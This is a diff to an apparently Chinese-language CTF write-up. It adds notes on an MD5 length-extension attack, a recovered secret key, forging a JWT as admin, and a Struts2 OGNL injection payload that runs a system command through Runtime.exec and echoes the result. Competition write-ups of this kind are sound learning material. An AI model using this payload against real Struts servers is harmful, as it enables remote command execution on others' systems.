@@ -24,7 +24,20 @@ if (!empty($_COOKIE["digest"])) {
     }
 }
 ```
+
+md5扩展攻击
+
+获取到secret-key`sk-he00lctf3r` 根据题目名也知道应该是要考struts
+伪造jwt为admin
+在age框里输入*payload*可以回显命令执行结果
+```
+' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
+```
+
+
 # reverse
+### GoGpt
+一道go的逆向题
 
 # pwn
 
